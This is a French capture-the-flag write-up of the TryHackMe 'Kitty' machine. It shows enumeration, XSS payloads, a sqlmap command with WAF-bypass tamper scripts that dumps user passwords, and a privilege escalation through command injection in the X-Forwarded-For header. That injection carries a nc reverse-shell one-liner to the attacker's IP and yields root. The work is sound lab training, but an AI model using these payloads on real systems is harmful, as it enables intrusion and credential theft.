# ROOM : Kitty
Une room medium avec un chat trop mignon :D.

# Infos
RIP Kitty!

# Enumeration
## NMAP
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-25 03:13 EDT
Nmap scan report for kitty.thm (10.10.140.249)
Host is up (0.032s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b0:c5:69:e6:dd:6b:81:0c:da:32:be:41:e3:5b:97:87 (RSA)
|   256 6c:65:ad:87:08:7a:3e:4c:7d:ea:3a:30:76:4d:04:16 (ECDSA)
|_  256 2d:57:1d:56:f6:56:52:29:ea:aa:da:33:b2:77:2c:9c (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Login
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.47 seconds
```
## GOBUSTER
```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.140.249
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/server-status        (Status: 403) [Size: 278]
```
# Recherche / Exploitation
## Wapiti
On ma parler de l'outil **Wapiti** et j'ai donc tout naturellement voulu le test sur ce chall !

Il trouve une XSS, l'outil a l'air vraiment pas mal et assez clair dans son retour. Il donne la requête :
```
XSS vulnerability in http://10.10.140.249/register.php via injection in the parameter password
Evil request:
    POST /register.php HTTP/1.1
    Host: 10.10.140.249
    Referer: http://10.10.140.249/register.php
    Content-Type: application/x-www-form-urlencoded

    username=alice&password=%22%3E%3CScRiPt%3Ealert%28%27wbw9vix7f6%27%29%3C%2FsCrIpT%3E&confirm_password=
```
J'essaye de transformer la XSS en LFI pour voir si je peux trouver des trucs interesant...

Exemple de payload utilisé:
```
"><ScRipT>document.write('<iframe src=///etc/passwd></iframe>');</ScRipT>
"><ScRipT>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open('GET','file:///etc/passwd');x.send();</ScRipT>
```
mais aucuns ne fonctionne... Il n'affiche rien.

## SQLMap
Après quelques tests avec la XSS, je test une SQLi.

J'ai une réponse positive avec le payload **test' AND 1=1 -- -** je vais donc test SQLMap pour trouver quelques choses.
```
[03:33:08] [WARNING] POST parameter 'username' does not seem to be injectable
[03:33:08] [WARNING] POST parameter 'password' does not appear to be dynamic
[03:33:08] [WARNING] heuristic (basic) test shows that POST parameter 'password' might not be injectable
[03:33:08] [INFO] testing for SQL injection on POST parameter 'password'
[03:33:08] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[03:33:09] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[03:33:09] [INFO] testing 'Generic inline queries'
[03:33:09] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[03:33:09] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[03:33:09] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[03:33:10] [WARNING] POST parameter 'password' does not seem to be injectable
[03:33:10] [ERROR] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent', skipping to the next target
```
Hummmm... Je test avec des level/risk différents et il me trouve bien un paramètre injectable et la DB (Il s'agit d'une database MySQL)
Je retest donc en lui indiquant que c'est un mysql avec l'argument **--dbms=mysql** mais le site passe en timeout et SQLMap n'arrive pas à le joindre...

Je test en ajoutant l'argument **--flush-session** qui permet de reset la session de SQLMap, mais c'est toujours en timeout, mais ca aide à avancer de repartir de 0.

Après plusieurs tests, je constate que le champ **username** est vulnérable seulement avec un compte existant. La SQLi fonctionne avec mon compte **test** qui existe mais pas avec **rgrg' AND 1=1 -- -** qui n'existe pas.
Je vais donc utiliser l'argument **--forms** afin de lui fournir mon compte existant. J'utilise aussi l'argument **--drop-set-cookie** en complément afin d'avoir à chaque fois une nouvelle tentative sans le cookie **PHPSESSID**.

Finalement, après des heures de tests et de recherches (Je crois que j'ai du ajouter 4-5H sur la machine), je trouve les bonnes commandes sqlmap pour faire parler la DB, il commence par m'afficher qu'il éxiste 4 colonnes par exemple:
```
[05:01:29] [INFO] target URL appears to have 4 columns in query
```
ou encore, il me dis qu'il y a visiblement un WAF/IPS:
```
[04:47:56] [CRITICAL] previous heuristics detected that the target is protected by some kind of WAF/IPS
```
SQLMap me conseil d'utiliser l'argument **--tamper** je me renseigne donc sur les différents script disponible (sur kali, ils sont dans **/usr/share/sqlmap/tamper**). 
Je trouve le script **ifnull2ifisnull** qui transforme les **IFNULL(A, B)** en **(ISNULL(A), B, A)** ce qui permet de contourner certains filtres, je me dis que ca contournera peut-être le WAF/IPS.
Je trouve aussi le script **hex2char** qui concerne MySQL, il permet de passer d'un string en hexa vers du char.

J'arrive enfin à voir le contenue de la DB, Voici la commande finale qui ma permis de le faire:
```
sqlmap -u "http://kitty.thm" --forms --dbms=mysql -p username --dump --tamper=ifnull2ifisnull,hex2char --skip-heuristic --drop-set-cookie --flush-session
```
```
Database: mywebsite
Table: siteusers
[2 entries]
+----+-----------------+----------+---------------------+
| id | password        | username | created_at          |
+----+-----------------+----------+---------------------+
| 1  | L[...]Y         | kitty    | 2022-11-08 03:17:39 |
| 2  | jetest123       | test     | 2024-07-25 07:31:51 |
+----+-----------------+----------+---------------------+
```
J'ai test le compte sur le site et cela ne fait rien de plus. Je test donc avec SSH et c'est bon :
```
┌──(kali㉿kali)-[~/Challenge/TryHackMe/Kitty]
└─$ ssh kitty@kitty.thm             
The authenticity of host 'kitty.thm (10.10.140.249)' can't be established.
ED25519 key fingerprint is SHA256:WTDPRyiPy3rCqiR/rmX9VfkhPJHnjOBi9d1y6qbokKY.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'kitty.thm' (ED25519) to the list of known hosts.
kitty@kitty.thm's password: 
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-139-generic x86_64)

[...]

Last login: Tue Nov  8 01:59:23 2022 from 10.0.2.26
kitty@kitty:~$ 

```

# Post-Exploitation et Privesc to Root 
On arrive donc en tant que **kitty**. 
On a pas de droit sudo, pas de tache cron, c'est le seul user (or root) qui a un bash.

Dans le dossier **/opt** je trouve un script
```
kitty@kitty:/$ cd opt/
kitty@kitty:/opt$ ls
log_checker.sh
kitty@kitty:/opt$ cat log_checker.sh 
#!/bin/sh
while read ip;
do
  /usr/bin/sh -c "echo $ip >> /root/logged";
done < /var/www/development/logged
cat /dev/null > /var/www/development/logged
```
nous verrons plus tard, continuons les recherches..


Dans **/var/www/html** je trouve un fichier **config.php** qui contient un mdp mysql:
```
kitty@kitty:/var/www/html$ cat config.php 
<?php
/* Database credentials. Assuming you are running MySQL
server with default setting (user 'root' with no password) */
define('DB_SERVER', 'localhost');
define('DB_USERNAME', 'kitty');
define('DB_PASSWORD', 'Sup3rAwesOm3Cat!');
define('DB_NAME', 'mywebsite');
```
Dans le dossier **/var/www** il y a aussi un dossier **developpment**
```
kitty@kitty:/var/www/development$ cat config.php 
<?php
/* Database credentials. Assuming you are running MySQL
server with default setting (user 'root' with no password) */
define('DB_SERVER', 'localhost');
define('DB_USERNAME', 'kitty');
define('DB_PASSWORD', 'Sup3rAwesOm3Cat!');
define('DB_NAME', 'devsite');

```
Mêmes creds mais une DB différente. Je recherche des potentielles sous domaines avec wfuzz au cas où mais je ne trouve rien.
```
┌──(kali㉿kali)-[~/Challenge/TryHackMe/Kitty]
└─$ wfuzz -c -u http://kitty.thm -H "Host: FUZZ.kitty.thm" -w /home/kali/Wordlist/subdomains-top1million-5000.txt --hw 76
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://kitty.thm/
Total requests: 4989

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                             
=====================================================================


Total time: 18.01916
Processed Requests: 4989
Filtered Requests: 4989
Requests/sec.: 276.8719
```
Je tente avec linpeas et celui-ci me trouve le port 8080 d'ouvert, j'aurai du regarder par ici plus tôt effectivement !
```
tcp   LISTEN 0      511             127.0.0.1:8080         0.0.0.0:*                                                                                                                 
tcp   LISTEN 0      4096        127.0.0.53%lo:53           0.0.0.0:*            
tcp   LISTEN 0      128               0.0.0.0:22           0.0.0.0:*            
tcp   LISTEN 0      70              127.0.0.1:33060        0.0.0.0:*            
tcp   LISTEN 0      151             127.0.0.1:3306         0.0.0.0:*            
tcp   LISTEN 0      511                     *:80                 *:*            
tcp   LISTEN 0      128                  [::]:22              [::]:*
```
Avec curl, je vois qu'il s'agit visiblement du même website que sur le port 80
```
kitty@kitty:/var/www/development$ curl -k "http://127.0.0.1:8080"


<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Login</title>
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <style>
        body{ font: 14px sans-serif; }
        .wrapper{ width: 360px; padding: 20px; }
    </style>
</head>
<body>
    <div class="wrapper">
        <h2>Development User Login</h2>
        <p>Please fill in your credentials to login.</p>


        <form action="/index.php" method="post">
            <div class="form-group">
                <label>Username</label>
                <input type="text" name="username" class="form-control">
            </div>    
            <div class="form-group">
                <label>Password</label>
                <input type="password" name="password" class="form-control">
            </div>
            <div class="form-group">
                <input type="submit" class="btn btn-primary" value="Login">
            </div>
            <p>Don't have an account? <a href="register.php">Sign up now</a>.</p>
        </form>
    </div>
</body>
</html>

```
dans le fichier **index.php** on retrouve la protection contre les SQLi et SQLMap, et je comprend donc mes galères avec SQLmap !:
```
// SQLMap 
$evilwords = ["/sleep/i", "/0x/i", "/\*\*/", "/-- [a-z0-9]{4}/i", "/ifnull/i", "/ or /i"];
foreach ($evilwords as $evilword) {
        if (preg_match( $evilword, $username )) {
                echo 'SQL Injection detected. This incident will be logged!';
                $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
                $ip .= "\n";
                file_put_contents("/var/www/development/logged", $ip);
                die();
        } elseif (preg_match( $evilword, $password )) {
                echo 'SQL Injection detected. This incident will be logged!';
                $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
                $ip .= "\n";
                file_put_contents("/var/www/development/logged", $ip);
                die();
        }
}
```
On vois aussi qu'il écris dans le fichier **/var/www/development/logged** qui est utilisé dans le script **log_checker.sh**.


Le script utilise **/usr/bin/sh -c "echo $ip >> /root/logged";** qui est vulnérable car elle utilise le binaire **/usr/bin/sh** avec l'argument **-c** (*-c = command string*) puis, il utilise **echo** pour écrire. On peux donc rajouter des commandes après **echo** avec un **;** (point-virgule) par exemple.

J'ai donc 2 idées ici.

1) Si je met un shell dans le script **log_checker.sh** et que je tente une injection SQL pour déclancher la "protection", peut-être que j'aurai un shell.
2) Il utilise le header **X-Forwarded-For** pour remplir la variable **$ip** puis l'écrire dans le fichier **logged**. Si je met mon payload dans le header, peut-être qu'il me l'executera et j'aurai un shell.

## Idée 1
Je n'avais pas regarder les permissions... Je ne peux pas écrire dans le script, ni dans le fichier **logged**. Donc mauvaise idée.

## Idée 2
On va test le header du coup !

Je vais déjà test de me ping voir si je peux executer des commandes via le header.

Je met en écoute le protocole **icmp** avec tcpdump:
```
┌──(kali㉿kali)-[~]
└─$ sudo tcpdump -i any icmp
tcpdump: data link type LINUX_SLL2
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on any, link-type LINUX_SLL2 (Linux cooked v2), snapshot length 262144 bytes
```
Je fait une sqli afin de me faire log par la protection:
```
kitty@kitty:/var/www/development$ curl -k "http://127.0.0.1:8080/index.php" -d "username=bla&password=bla' OR 1=1 -- -" --header "X-Forwarded-For:;ping 10.11.50.195 -c 4"

SQL Injection detected. This incident will be logged!
```
Et je reçoit bien mon ping :
```
06:10:00.907368 tun0  In  IP kitty.thm > 10.11.50.195: ICMP echo request, id 1, seq 1, length 64
06:10:00.907419 tun0  Out IP 10.11.50.195 > kitty.thm: ICMP echo reply, id 1, seq 1, length 64
06:10:01.908481 tun0  In  IP kitty.thm > 10.11.50.195: ICMP echo request, id 1, seq 2, length 64
06:10:01.908506 tun0  Out IP 10.11.50.195 > kitty.thm: ICMP echo reply, id 1, seq 2, length 64
06:10:02.910564 tun0  In  IP kitty.thm > 10.11.50.195: ICMP echo request, id 1, seq 3, length 64
06:10:02.910602 tun0  Out IP 10.11.50.195 > kitty.thm: ICMP echo reply, id 1, seq 3, length 64
```
J'ouvre donc un shell :)
```
kitty@kitty:/var/www/development$ curl -k "http://127.0.0.1:8080/index.php" -d "username=bla&password=bla' OR 1=1 -- -" --header "X-Forwarded-For:;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.50.195 4445 >/tmp/f;"

SQL Injection detected. This incident will be logged!
```
```
┌──(kali㉿kali)-[~/Challenge/TryHackMe/Kitty]
└─$ nc -lnvp 4445
listening on [any] 4445 ...
connect to [10.11.50.195] from (UNKNOWN) [10.10.140.249] 39256
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
```
